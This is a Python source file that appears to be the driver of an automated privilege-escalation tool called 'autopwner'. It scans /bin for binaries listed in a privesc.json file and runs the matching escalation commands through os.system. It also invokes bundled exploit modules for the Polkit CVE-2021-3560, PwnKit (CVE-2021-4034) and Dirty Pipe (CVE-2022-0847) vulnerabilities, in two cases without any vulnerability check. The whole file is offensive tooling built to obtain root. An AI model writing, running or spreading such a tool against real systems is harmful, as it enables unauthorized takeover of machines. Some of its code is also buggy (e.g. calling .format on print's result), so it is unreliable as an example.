import subprocess
from colorama import Fore
import os
import json
from main import intro
import platform
import cve_2021_3560 as cve_3560
import cve_2021_4034 as pwkit
import cve_2022_0847 as dirtyPipe
sys = platform.system()

def cmdPrint(cmd):
    print(Fore.RED, f"[+] Found {cmd}", Fore.RESET)

def tryPrint(cmd):
    print(Fore.RED, f"Trying {cmd}", Fore.RESET)

def uknownOS():
    global sys
    lin = 0
    win = 0
    lin_cmds = ["ls", "clear", "ifconfig", "grep", "apt",]
    win_cmds = ["cls", "sfc", "ipconfig", "regedit", "chkdsk"]
    for cmd in lin_cmds:
        test = subprocess.run(cmd, stdout=subprocess.PIPE, text=True, shell=True)
        if test.returncode == 0:
            lin +=1
    for cmd in win_cmds:
        test = subprocess.run(cmd, stdout=subprocess.PIPE, text=True, shell=True)
        if test.returncode == 0:
            win +=1
    if win == lin:
        sys = "Linux"
        print("{} can run Linux and Windows commands").format(sys)
    elif win > lin:
        print("{} uses Windows commands").format(sys)
        sys = "Windows"
    elif lin > win:
        sys = "Linux"
        print("{} uses Linux commands").format(sys)
with open("privesc.json") as f:
    privescs = json.load(f)

def main(file_esc, cve):
    intro(""" \n ██▓███   ██▀███   ██▓ ██▒   █▓▓█████   ██████  ▄████▄       ██████  ███▄    █  ██▓ ██▓███  ▓█████  ██▀███  \n▓██░  ██▒▓██ ▒ ██▒▓██▒▓██░   █▒▓█   ▀ ▒██    ▒ ▒██▀ ▀█     ▒██    ▒  ██ ▀█   █ ▓██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒\n▓██░ ██▓▒▓██ ░▄█ ▒▒██▒ ▓██  █▒░▒███   ░ ▓██▄   ▒▓█    ▄    ░ ▓██▄   ▓██  ▀█ ██▒▒██▒▓██░ ██▓▒▒███   ▓██ ░▄█ ▒\n▒██▄█▓▒ ▒▒██▀▀█▄  ░██░  ▒██ █░░▒▓█  ▄   ▒   ██▒▒▓▓▄ ▄██▒     ▒   ██▒▓██▒  ▐▌██▒░██░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  \n▒██▒ ░  ░░██▓ ▒██▒░██░   ▒▀█░  ░▒████▒▒██████▒▒▒ ▓███▀ ░   ▒██████▒▒▒██░   ▓██░░██░▒██▒ ░  ░░▒████▒░██▓ ▒██▒\n▒▓▒░ ░  ░░ ▒▓ ░▒▓░░▓     ░ ▐░  ░░ ▒░ ░▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░   ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░▓  ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░\n░▒ ░       ░▒ ░ ▒░ ▒ ░   ░ ░░   ░ ░  ░░ ░▒  ░ ░  ░  ▒      ░ ░▒  ░ ░░ ░░   ░ ▒░ ▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░\n░░         ░░   ░  ▒ ░     ░░     ░   ░  ░  ░  ░           ░  ░  ░     ░   ░ ░  ▒ ░░░          ░     ░░   ░ \n            ░      ░        ░     ░  ░      ░  ░ ░               ░           ░  ░              ░  ░   ░     \n                           ░                   ░                                                            \n""")
    output = subprocess.run(['ls', '/bin'], stdout=subprocess.PIPE, text=True)
    output = (output).stdout.split('\n')
    if sys == "Linux":
        cmdPrint("Linux")
    elif sys == "Windows":
        cmdPrint("Windows")
    else:
        cmdPrint(sys)
        print("Sadly i dont have any exploits for {}, please post your current system at github \nhttps://github.com/senshiofficial/autopwner/issues").format(sys)
        print("Trying to figure out if its Windows or Linux based")
        uknownOS()
    if file_esc == True:
        mode = 2
    elif file_esc == False:
        mode = 1
    else:
        mode = int(input("\n1 - check for sudo PrivEsc\n2 - Check for file PrivEsc\n$ "))
    if cve:
        CVEcheck()
    if mode == 1:
        checkPrivEsc(output)
    elif mode == 2:
        checkFileAccess(output)
    if cve:
        CVEcheck()

def ask_another():
    answer = input("do you want to try another? [y/n]> ")
    if answer.lower()[:1] == "y":
        return True
    else:
        return False

def thank():
    print("Thanks for using")
    exit()

def runCmd(cmds):
    for cmd in cmds:
        tryPrint(cmd)
        cmd_status = os.system(cmds[cmd])
        if cmd_status == 0 and not ask_another():
            thank()

def CVEcheck():
    if cve_3560.check():
        cmdPrint("cve-2021-3560")
        cve_3560.main()
    
    cmdPrint("Pwkit (CVE-2021-4034)")
    pwkit.main()
    
    cmdPrint("Dirty Pipe (CVE-2022-0847)")
    dirtyPipe.main()

def checkPrivEsc(output):
    global sys
    cmds = {}
    for cmd in output:
        if cmd in privescs["su"][sys]:
            cmdPrint(cmd)
            cmds[cmd] = privescs["su"][sys][cmd]
    runCmd(cmds)

def checkFileAccess(output):
    cmds = {}
    for cmd in output:
        if cmd in privescs["file"][sys]:
            cmdPrint(cmd)
            cmds[cmd] = privescs["file"][sys][cmd]
    runCmd(cmds)
